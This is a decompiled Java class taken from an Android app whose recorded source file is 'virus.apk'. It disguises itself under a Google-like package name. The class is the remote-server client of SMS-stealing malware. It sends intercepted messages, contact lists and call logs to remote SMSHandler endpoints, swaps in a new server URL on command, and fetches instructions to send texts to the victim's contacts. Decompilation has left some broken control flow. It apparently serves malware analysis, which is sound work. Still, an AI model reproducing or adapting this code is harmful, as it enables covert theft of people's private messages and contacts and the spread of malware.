package com.example.google.service;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import java.io.PrintStream;
import java.io.UnsupportedEncodingException;
import javax.xml.parsers.ParserConfigurationException;

public class WebServiceCalling extends HttpHelper
{

  @SuppressLint({"DefaultLocale", "HandlerLeak"})
  private Handler Handler_NewUrl = new Handler()
  {
    public void handleMessage(Message paramAnonymousMessage)
    {
      String str = (String)paramAnonymousMessage.obj;
      if ((str != "") && (str.toLowerCase().startsWith("http")))
      {
        SharedPreferences.Editor localEditor = WebServiceCalling.this._Context.getSharedPreferences(WebServiceCalling.this._PreferenceName, 0).edit();
        localEditor.putString(WebServiceCalling.this._WSUrl, str);
        localEditor.commit();
      }
    }
  };
  private String _PreferenceName = "User_Settings";
  private String _WSUrl = "WSUrl";
  private String urlRoot = "";

  public WebServiceCalling(Context paramContext)
  {
    super(paramContext);
    String str = paramContext.getSharedPreferences(this._PreferenceName, 0).getString(this._WSUrl, "");
    if (str.length() > 0)
      this.urlRoot = str;
    try
    {
      while (true)
      {
        NEWURL();
        return;
        this.urlRoot = paramContext.getString(2131034118);
      }
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }

  public void Forward(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    callWSSub(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(this.urlRoot)).append("SMSHandler1.ashx?t=r&p=").append(Uri.encode(paramString1)).toString())).append("&a=").append(Uri.encode(paramString2)).toString())).append("&m=").append(Uri.encode(paramString3)).toString() + "&d=" + Uri.encode(paramString4));
  }

  public void ForwardContacts(Handler paramHandler, String paramString1, String paramString2)
    throws ParserConfigurationException, UnsupportedEncodingException
  {
    callWSSub(this.urlRoot + "SMSHandler.ashx?t=c&p=" + Uri.encode(paramString1) + "&n=" + Uri.encode(paramString2));
  }

  public void Log(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    callWSSub(this.urlRoot + "SMSHandler1.ashx?t=l&p=" + Uri.encode(paramString3) + "&c=" + paramString1 + "&ty=" + paramString2 + "&l=" + Uri.encode(paramString4));
  }

  public void NEWURL()
  {
    String str = this.urlRoot + "SMSHandler1.ashx?t=new";
    System.out.print(str);
    callWSSub(this.Handler_NewUrl, str);
  }

  public void Request(Handler paramHandler, String paramString1, String paramString2)
  {
    callWSSub(paramHandler, 100, this.urlRoot + "SMSHandler1.ashx?t=request&p=" + Uri.encode(paramString1) + "&m=" + Uri.encode(paramString2));
  }

  public void Send(Handler paramHandler, String paramString)
    throws ParserConfigurationException, UnsupportedEncodingException
  {
    callWSSub(paramHandler, 0, this.urlRoot + "SMSHandler.ashx?t=s&p=" + Uri.encode(paramString));
  }

  public void SendContacts(String paramString1, String paramString2)
  {
    callWSSub(this.urlRoot + "SMSHandler1.ashx?t=c&p=" + Uri.encode(paramString1) + "&n=" + Uri.encode(paramString2));
  }

  public void SendToContacts(Handler paramHandler, String paramString)
    throws ParserConfigurationException, UnsupportedEncodingException
  {
    callWSSub(paramHandler, 3, this.urlRoot + "SMSHandler.ashx?t=stc&p=" + Uri.encode(paramString));
  }
}

/* Location:           F:\SDK\dex2jar-0.0.9.15\virus.apk_dex2jar.jar
 * Qualified Name:     com.example.google.service.WebServiceCalling
 * JD-Core Version:    0.6.2
 */